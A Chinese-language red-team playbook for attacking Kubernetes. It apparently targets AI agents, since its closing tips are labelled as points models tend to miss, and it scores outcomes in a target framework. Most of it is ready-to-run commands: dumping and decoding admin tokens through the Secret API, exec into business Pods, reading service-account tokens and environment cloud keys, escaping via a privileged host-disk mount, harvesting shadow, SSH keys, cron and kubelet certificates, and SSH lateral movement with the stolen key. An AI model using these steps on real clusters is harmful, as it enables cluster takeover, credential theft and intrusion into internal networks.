# K8s 打穿内网 — 云原生攻击链速查

> 场景：目标暴露 K8s 管理面（面板/API/kubelet/etcd），或 Web 突破后发现目标是容器环境。
> 实战基准链：K8s 面板 → Secret API 偷 token → exec 业务 Pod → 特权容器挂宿主盘逃逸 →
> 宿主机收割（shadow/id_rsa/cron/Jenkins）→ SSH 横向下一台。结果参考：双生产集群
> cluster-admin 沦陷 + 宿主机 root + 全量备份泄露 + 云账号凭据。
> OPSEC：`-o ro` 只读挂载宿主盘防搞坏；exec 只选业务 Pod 不动系统组件（etcd/apiserver
> 卡死影响整集群稳定性，违反最小破坏）。

---

## 1. 入口向量（管理面暴露清单，按命中率排序）

| 向量 | 探测 | 命中特征 |
|------|------|---------|
| Dashboard NodePort 暴露 | 端口扫 30000-32767 / 常见 8443+NodePort | K8s 登录框（经典深色 UI） |
| **教程式部署**（最常见根因） | 拿到面板后看 SA 名 | `admin-user` + cluster-admin 绑定 + 导出 token 教程残留 |
| API Server 匿名/弱授权 | `curl -k https://<ip>:6443/api/v1/namespaces` | 200 列出 namespace 即匿名可读 |
| kubelet 10250 匿名 | `curl -k https://<ip>:10250/pods` | 200 出 Pod 列表 |
| etcd 2379 匿名 | `etcdctl --insecure-transport=false ... endpoint health` | 无认证可读写 |
| Secret API 可列举 | `GET /api/v1/secrets` 或按 ns | 200 返回 secrets 列表 |

**教程式部署四步根因**（= 攻击面）：`kubectl create sa admin-user` → 绑 `cluster-admin` →
导出 token 登面板 → NodePort 暴露。几乎人人可顶着 admin token 操纵整个集群。

## 2. Secret API 偷 token（面板前置）

```bash
# 1) 列 secrets，找 admin token 在哪个 namespace
curl -sk https://<api>/api/v1/secrets | jq '.items[].metadata | {name, namespace}'
# 2) 构造接口取 token（按 namespace 定位 secret 名）
curl -sk https://<api>/api/v1/namespaces/<ns>/secrets/<admin-secret-name> | jq -r '.data.token' | base64 -d
# 3) token 填进面板登录框 → 或直接打 API Server
```

> 细节：token 是 base64 存的，要解码再用。kubeconfig/SA token 同理。

## 3. 选 Pod 策略（为什么选业务 Pod 不选系统 Pod）

1. **业务 Pod 里才有货**：env 硬编码云凭据（OSS/MQ AK-SK）、源码（/app）、数据挂载（NFS）
2. **最小破坏**：exec 业务 Pod 只影响单副本；动 etcd/apiserver 可能搞死整个集群
3. **碰运气逃逸面**：业务 Pod（尤其 GPU Pod）常是特权容器

选完 `exec` 进 Pod 拿 shell。

## 4. Pod 内侦察五问（进 Pod 先跑这套）

```bash
# ① 我是谁？
id; grep CapEff /proc/self/status      # CapEff 全 f = 特权容器，有越狱资本
cat /proc/1/cgroup | head -1           # 在哪个 Pod
# ② 我在哪？
hostname -i; cat /etc/hosts; ip route  # 自身 IP + 内网网段
# ③ 我挂了什么？
mount | grep -v cgroup; lsblk          # hostPath/hostroot 挂载 = 逃逸直通道
# ④ 我有什么凭据？
cat /proc/1/environ | tr '\0' '\n'     # env 硬编码 OSS/MQ 云密钥
ls /var/run/secrets/kubernetes.io/serviceaccount/   # SA token → 集群身份
# ⑤ 集群权限多大？
curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://<kubernetes.svc>:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'
# secrets 可读 = 凭据池
```

## 5. 逃逸检查表（按序过，命中即走对应手法）

| # | 检查 | 命中 → 手法 |
|---|------|------------|
| 1 | `grep CapEff` 全 f / 含 CAP_SYS_ADMIN | 特权容器 → 直接 §6 挂盘 |
| 2 | `lsblk` / `mount` 见宿主目录（hostroot）或 hostPath / | 已挂宿主文件系统 → 直接读 |
| 3 | `ls /dev/dm*` / `/dev/sd*` 可见 | 容器看得到宿主物理盘 → mount 挂进来 |
| 4 | `/var/run/docker.sock` 存在 | 挂 socket → 起特权兄弟容器 |
| 5 | hostPID=1（`ps aux` 见宿主进程） | nsenter 进宿主 namespace |
| 6 | cgroup v1 可写 + release_agent 路径 | cgroup release_agent 逃逸 |
| 7 | 内核漏洞面（脏管/CVE-2022-0847 等） | 最后手段 |

## 6. 挂宿主盘逃逸（实战链主手法）

```bash
mkdir /tmp/hostroot /tmp/hostdata
# XFS/ext4 均先试 dm-0；-o ro 只读防搞坏宿主（OPSEC 硬要求）
mount -o ro /dev/dm-0 /tmp/hostroot
# 验证越狱成功：读到了宿主机名
cat /tmp/hostroot/etc/hostname    # → master14
```

> 看磁盘头确认文件系统（XFS magic `XFSB`）。只读挂载拿数据已够；要写操作再评估。

## 7. 宿主机收割清单（$H = /tmp/hostroot）

| 目标 | 命令 | 价值 |
|------|------|------|
| 密码文件 | `cat $H/etc/shadow` | 离线破解 |
| SSH 私钥 | `ls $H/root/.ssh/` + 拷 `id_rsa` | 横向免密 |
| **横向名单** | `awk '{print $1}' $H/root/.ssh/known_hosts` | 这台机器连过谁（内网 IP 清单） |
| 定时任务 | `cat $H/var/spool/cron/root` | 备份/同步目标 = 下一个攻击目标（如 192.168.110.15） |
| Jenkins | `ls $H/var/lib/jenkins/` | 凭据/keychain |
| 数据盘 | `ls /tmp/hostdata/`（gitea/mysql/harbor 目录） | 打包核心数据 |
| kubelet pki | `ls $H/var/lib/kubelet/pki/` | 节点证书 → 直接接管集群 |
| 云凭据 | env / 实例元数据 `169.254.169.254` | 云账号接管 |

## 8. 横向移动（K8s 面打法）

```bash
# 偷到的宿主机私钥直连下一个目标（known_hosts/cron 里找的）
cp $H/root/.ssh/id_rsa /tmp/.k && chmod 600 /tmp/.k
ssh -i /tmp/.k root@192.168.110.15 'id'    # uid=0(root) → 下一台到手
```

- SSH 链：id_rsa + known_hosts 名单逐台试（运维常全内网同一把钥匙）
- 集群链：kubelet pki → 本节点 kubectl 操作；admin token → 控制双集群
- 云链：AK/SK → 云控制台 → 云管/VPN（汇入 red-team 目标体系 centralised_system）
- 拿新主机后回 A2 提权→导凭证→再横向（Linux 主机同时参考 `redteam/privesc/linux.md`）

## 9. 得分映射（red-team 目标体系）

| 成果 | category | 权重 |
|------|----------|------|
| K8s 集群接管（cluster-admin/双集群） | centralised_system | critical |
| 宿主机 root | server_control | high |
| 全量 secrets/etcd 数据 | intranet_data | high |
| 云账号凭据（AK/SK） | centralised_system | high |
| 内网每台主机 | intranet_host | medium（累加） |

## 10. TRICK NOTES — 模型易漏点

1. **别只打面板**：面板有验证码/登录墙时，直接打 API Server 6443 / kubelet 10250 匿名面。
2. **Secret API 是凭据池**：列举权限 ≥ 单个 token 价值——数据库密码/镜像仓库凭证全在里面。
3. **挂盘先 `-o ro`**：rw 挂载搞坏宿主文件系统 = 事故，红队纪律红线。
4. **known_hosts/cron 是横向地图**：别急着扫全网段，宿主机历史里已有现成目标清单。
5. **Pod 选择=得分选择**：系统 Pod 看着权限高但没货且危险；业务 Pod 凭据+数据+可能特权。
6. **逃逸前先确认 CapEff**：非特权容器走 §5 的 4-7 项，别在挂盘上浪费时间。
7. **面板拿下的第一件事**：看 SA 是不是 `admin-user`（教程式部署指纹）——是则 cluster-admin 直接到手。
